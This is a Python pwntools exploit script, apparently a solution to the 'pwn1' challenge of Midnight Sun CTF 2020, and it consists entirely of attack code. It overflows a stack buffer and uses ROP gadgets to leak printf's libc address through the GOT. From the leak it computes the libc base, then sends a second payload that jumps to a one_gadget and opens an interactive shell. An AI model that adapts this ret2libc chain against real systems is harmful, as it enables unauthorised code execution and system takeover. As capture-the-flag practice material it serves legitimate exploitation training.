#!/usr/bin/env python3

from pwn import *
import re
from IPython import embed

r = process("/home/esc/ctf/midnightsun2020/pwn1/pwn1")
# r = remote("0.0.0.0", 9998)
e = ELF("/home/esc/ctf/midnightsun2020/pwn1/pwn1")
libc = ELF("/usr/lib/libc.so.6")
input()

payload = b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa"
payload += p64(0x0000000000400783)  # pop rdi; ret;
payload += p64(e.got.get("printf"))
#  '__libc_start_main': 6299632,
payload += p64(e.plt.get("printf"))
# payload += p64(e.symbols["__libc_start_main"])
payload += p64(0x400698)
r.sendline(payload)
dump = r.clean(1).decode("latin-1")
libc_printf_addr = re.search("buffer: (.{6}) ", dump).groups()[0].ljust(8, "\0")
print(libc_printf_addr)
# embed()

payload = b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa"
libc_start = u64(libc_printf_addr) - libc.symbols["printf"]
print(hex(u64(libc_printf_addr)))
print(hex(libc_start))
one_gadget = libc_start + 0xCD530
print(hex(one_gadget))
input()

payload += p64(0x0000000000400781)  # pop rsi; pop r15; ret
payload += p64(0) + p64(0)
payload += p64(one_gadget)

r.sendline(payload)

r.interactive()

# payload +=
